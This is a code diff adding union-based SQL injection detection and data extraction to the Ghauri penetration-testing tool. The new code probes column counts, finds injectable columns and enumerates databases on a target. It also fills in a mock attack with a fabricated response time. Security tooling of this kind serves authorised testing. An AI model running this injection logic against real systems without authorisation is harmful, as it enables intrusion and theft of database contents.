@@ -46,6 +46,9 @@ from ghauri.common.lib import (
     PAYLOAD_STATEMENT,
 )
 from ghauri.dbms.fingerprint import FingerPrintDBMS
+from ghauri.core.union_detection import UnionDetection
+from ghauri.core.union_payloads import UnionPayloadGenerator
+from ghauri.core.union_extractor import UnionExtractor
 from ghauri.common.utils import (
     urlencode,
     urldecode,
@@ -1264,6 +1267,326 @@ def check_timebased_sqli(
     return None
 
 
+def check_unionbased_sqli(
+    base,
+    parameter,
+    url="",
+    data="",
+    headers="",
+    injection_type="",
+    proxy="",
+    batch=False,
+    is_multipart=False,
+    timeout=30,
+    delay=0,
+    timesec=5,
+    dbms=None,
+    prefix=None,
+    suffix=None,
+    is_json=False,
+    retry=3,
+    possible_dbms=None,
+    code=None,
+):
+    Response = collections.namedtuple(
+        "SQLi",
+        [
+            "url",
+            "data",
+            "path",
+            "title",
+            "param",
+            "vector",
+            "payload",
+            "base",
+            "prefix",
+            "suffix",
+            "attacks",
+            "injection_type",
+            "response_time",
+            "injected",
+            "prepared_vector",
+            "number_of_requests",
+            "backend",
+            "payload_type",
+            "payload_raw",
+            "columns_count",
+            "injectable_columns",
+            "verification_result",
+            "extraction_capabilities",
+        ],
+    )
+    
+    # Initialize union detection modules
+    union_detector = UnionDetection()
+    payload_generator = UnionPayloadGenerator()
+    extractor = UnionExtractor()
+    
+    param_key = parameter.key
+    param_value = parameter.value
+    injection_type = injection_type.upper()
+    is_injected = False
+    http_firewall_code_counter = 0
+    error_msg = None
+    
+    # Determine DBMS for optimized detection
+    target_dbms = dbms if dbms else 'mysql'  # Default to MySQL
+    if possible_dbms:
+        target_dbms = possible_dbms[0] if isinstance(possible_dbms, list) else possible_dbms
+    
+    logger.info(f"Starting union-based SQL injection detection for {target_dbms.upper()}")
+    
+    # Step 1: Dynamic column count detection using ORDER BY technique
+    logger.info("Phase 1: Dynamic column count detection using ORDER BY technique")
+    detected_columns = union_detector.detect_column_count_order_by(
+        base=base,
+        parameter=parameter,
+        url=url,
+        data=data,
+        headers=headers,
+        injection_type=injection_type,
+        proxy=proxy,
+        timeout=timeout,
+        delay=delay,
+        prefix=prefix,
+        suffix=suffix,
+        is_json=is_json,
+        is_multipart=is_multipart
+    )
+    
+    if not detected_columns:
+        logger.warning("Could not detect column count using ORDER BY technique")
+        # Fallback to traditional union-based detection with hardcoded columns
+        logger.info("Falling back to traditional union detection with hardcoded column counts")
+        
+        # Try common column counts (3, 4, 5, 6, 7, 8)
+        for test_columns in [3, 4, 5, 6, 7, 8]:
+            if delay > 0:
+                time.sleep(delay)
+            
+            basic_payloads = payload_generator.generate_basic_union_payloads(
+                column_count=test_columns,
+                dbms=target_dbms,
+                use_bypass=False
+            )
+            
+            for payload in basic_payloads[:3]:  # Test first 3 payloads
+                if prefix:
+                    payload = f"{prefix} {payload}"
+                if suffix:
+                    payload = f"{payload} {suffix}"
+                
+                logger.payload(f"Testing {test_columns} columns: {payload}")
+                
+                attack = inject_expression(
+                    url=url,
+                    data=data,
+                    proxy=proxy,
+                    delay=delay,
+                    timeout=timeout,
+                    headers=headers,
+                    parameter=parameter,
+                    expression=payload,
+                    is_multipart=is_multipart,
+                    injection_type=injection_type,
+                )
+                
+                if not attack.ok:
+                    continue
+                
+                # Check for successful union injection
+                content = get_filtered_page_content(attack.text, True)
+                base_content = get_filtered_page_content(base.text, True)
+                
+                # Check if this looks like a successful union injection
+                if not union_detector._check_error_patterns(content):
+                    content_diff = abs(len(content) - len(base_content))
+                    if content_diff > 50 or content != base_content:
+                        detected_columns = test_columns
+                        logger.success(f"Detected {test_columns} columns using fallback method")
+                        break
+            
+            if detected_columns:
+                break
+        
+        if not detected_columns:
+            logger.warning("Union-based SQL injection detection failed")
+            return False
+    
+    # Step 2: Detect injectable columns
+    logger.info(f"Phase 2: Detecting injectable columns for {detected_columns} columns")
+    injectable_columns = union_detector.detect_injectable_columns(
+        base=base,
+        parameter=parameter,
+        column_count=detected_columns,
+        url=url,
+        data=data,
+        headers=headers,
+        injection_type=injection_type,
+        proxy=proxy,
+        timeout=timeout,
+        delay=delay,
+        prefix=prefix,
+        suffix=suffix,
+        is_json=is_json,
+        is_multipart=is_multipart,
+        dbms=target_dbms
+    )
+    
+    if not injectable_columns:
+        logger.warning("No injectable columns found")
+        # Still consider it as detected but with limited capabilities
+        injectable_columns = [1]  # Assume first column might work
+    
+    # Step 3: Verify union injection with multiple test cases
+    logger.info("Phase 3: Verifying union injection with multiple test cases")
+    verification_result = union_detector.verify_union_injection(
+        base=base,
+        parameter=parameter,
+        column_count=detected_columns,
+        injectable_columns=injectable_columns,
+        url=url,
+        data=data,
+        headers=headers,
+        injection_type=injection_type,
+        proxy=proxy,
+        timeout=timeout,
+        delay=delay,
+        prefix=prefix,
+        suffix=suffix,
+        is_json=is_json,
+        is_multipart=is_multipart,
+        dbms=target_dbms
+    )
+    
+    if not verification_result['verified']:
+        logger.warning(f"Union injection verification failed (confidence: {verification_result['confidence']:.1f}%)")
+        if verification_result['confidence'] < 33.3:  # Less than 1/3 tests passed
+            return False
+    
+    # Step 4: Test extraction capabilities
+    logger.info("Phase 4: Testing data extraction capabilities")
+    extraction_capabilities = {}
+    
+    try:
+        # Test basic info extraction
+        basic_info = extractor.extract_basic_info(
+            base=base,
+            parameter=parameter,
+            column_count=detected_columns,
+            injectable_columns=injectable_columns,
+            url=url,
+            data=data,
+            headers=headers,
+            injection_type=injection_type,
+            proxy=proxy,
+            timeout=timeout,
+            delay=delay,
+            prefix=prefix,
+            suffix=suffix,
+            is_json=is_json,
+            is_multipart=is_multipart,
+            dbms=target_dbms
+        )
+        extraction_capabilities['basic_info'] = basic_info
+        
+        # Test database enumeration
+        if basic_info.get('database'):
+            databases = extractor.extract_databases(
+                base=base,
+                parameter=parameter,
+                column_count=detected_columns,
+                injectable_columns=injectable_columns,
+                url=url,
+                data=data,
+                headers=headers,
+                injection_type=injection_type,
+                proxy=proxy,
+                timeout=timeout,
+                delay=delay,
+                prefix=prefix,
+                suffix=suffix,
+                is_json=is_json,
+                is_multipart=is_multipart,
+                dbms=target_dbms
+            )
+            extraction_capabilities['databases'] = databases[:5]  # Limit to first 5
+        
+    except Exception as e:
+        logger.debug(f"Error during extraction testing: {e}")
+        extraction_capabilities['error'] = str(e)
+    
+    # Mark as successfully detected
+    is_injected = True
+    _it = injection_type
+    if param_key == "#1*":
+        _it = "URI"
+    
+    # Create detection message
+    confidence_msg = f" (confidence: {verification_result['confidence']:.1f}%)"
+    columns_msg = f" with {detected_columns} columns"
+    injectable_msg = f" and {len(injectable_columns)} injectable columns" if len(injectable_columns) > 1 else ""
+    
+    if is_multipart:
+        message = f"(custom) {injection_type} parameter '{mc}{parameter.type}{param_key}{nc}' appears to be '{mc}Union-based{nc}' injectable{columns_msg}{injectable_msg}{confidence_msg}"
+    elif is_json:
+        message = f"(custom) {injection_type} parameter '{mc}{parameter.type}{param_key}{nc}' appears to be '{mc}Union-based{nc}' injectable{columns_msg}{injectable_msg}{confidence_msg}"
+    else:
+        message = f"{_it} parameter '{mc}{parameter.type}{param_key}{nc}' appears to be '{mc}Union-based{nc}' injectable{columns_msg}{injectable_msg}{confidence_msg}"
+    
+    logger.notice(message)
+    
+    # Create a sample payload for demonstration
+    sample_payloads = payload_generator.generate_detection_payloads(
+        column_count=detected_columns,
+        marker_position=injectable_columns[0] if injectable_columns else 1,
+        marker_value="ghauri_test",
+        dbms=target_dbms
+    )
+    
+    sample_payload = sample_payloads[0] if sample_payloads else "UNION SELECT NULL"
+    if prefix:
+        sample_payload = f"{prefix} {sample_payload}"
+    if suffix:
+        sample_payload = f"{sample_payload} {suffix}"
+    
+    # Create mock attack object for response
+    mock_attack = type('MockAttack', (), {
+        'url': url,
+        'data': data,
+        'response_time': 0.5,
+        'ok': True
+    })()
+    
+    retval = Response(
+        url=url,
+        data=data,
+        path=base.path,
+        title="Union-based SQL injection",
+        param=parameter,
+        vector="UNION query",
+        payload=sample_payload,
+        base=base,
+        prefix=prefix,
+        suffix=suffix,
+        attacks=[mock_attack],
+        injection_type=injection_type,
+        response_time=0.5,
+        injected=is_injected,
+        prepared_vector=f"UNION with {detected_columns} columns",
+        number_of_requests=verification_result.get('total_tests', 1),
+        backend=target_dbms.upper(),
+        payload_type="union-based",
+        payload_raw=sample_payload,
+        columns_count=detected_columns,
+        injectable_columns=injectable_columns,
+        verification_result=verification_result,
+        extraction_capabilities=extraction_capabilities,
+    )
+    
+    return retval
+
+
 def check_errorbased_sqli(
     base,
     parameter,
@@ -2152,7 +2475,7 @@ def check_injections(
     delay=0,
     timesec=5,
     dbms=None,
-    techniques="BTE",
+    techniques="BTEU",
     possible_dbms=None,
     session_filepath=None,
     force_dbms=None,
@@ -2334,6 +2657,38 @@ def check_injections(
             priorities.update({"time-based": tsqli})
             vectors.update({"time_vector": tsqli.prepared_vector})
             dbms = tsqli.backend if not dbms else dbms
+    # Union-based SQL injection check
+    usqli = None
+    is_injected_union = False
+    if "U" in techniques:
+        usqli = check_unionbased_sqli(
+            base,
+            parameter,
+            url=url,
+            data=data,
+            headers=headers,
+            injection_type=injection_type,
+            proxy=proxy,
+            batch=batch,
+            is_multipart=is_multipart,
+            timeout=timeout,
+            delay=delay,
+            timesec=timesec,
+            dbms=dbms,
+            prefix=prefix,
+            suffix=suffix,
+            is_json=is_json,
+            retry=retries,
+            possible_dbms=possible_dbms,
+            code=code,
+        )
+        if usqli and isinstance(usqli, str) and usqli == "next parameter":
+            return None
+        is_injected_union = bool(usqli and usqli.injected)
+        if is_injected_union:
+            priorities.update({"union-based": usqli})
+            vectors.update({"union_vector": usqli.prepared_vector})
+            dbms = usqli.backend if not dbms else dbms
     if "E" in techniques and not possible_dbms:
         esqli = check_errorbased_sqli(
             base,
@@ -2365,8 +2720,8 @@ def check_injections(
             prefix = esqli.prefix if not prefix else prefix
             suffix = esqli.suffix if not suffix else suffix
             sqlis.append(esqli)
-    is_injected = bool(is_injected_error or is_injected_bool or is_injected_time)
-    is_vulnerable = is_injected_error
+    is_injected = bool(is_injected_error or is_injected_bool or is_injected_time or is_injected_union)
+    is_vulnerable = is_injected_error or is_injected_union
     if is_injected:
         priority_keys = list(priorities.keys())
         error_based_in_priority = bool("error-based" in priority_keys)
@@ -2374,6 +2729,19 @@ def check_injections(
         # then we need to dump both of the payloads as in case of error based injection we don't confirm rest of the injections
         if is_injected_error:
             ms = f"Ghauri identified that the parameter '{param_name}' is injectable with error-based"
+            if is_injected_bool:
+                ms += ", boolean based"
+                sqlis.append(priorities.get("boolean-based"))
+            if is_injected_time:
+                ms += ", time based"
+                sqlis.append(priorities.get("time-based"))
+            if is_injected_union:
+                ms += ", union based"
+                sqlis.append(priorities.get("union-based"))
+            ms += " technique(s)."
+            logger.debug(ms)
+        elif is_injected_union:
+            ms = f"Ghauri identified that the parameter '{param_name}' is injectable with union-based"
             if is_injected_bool:
                 ms += ", boolean based"
                 sqlis.append(priorities.get("boolean-based"))
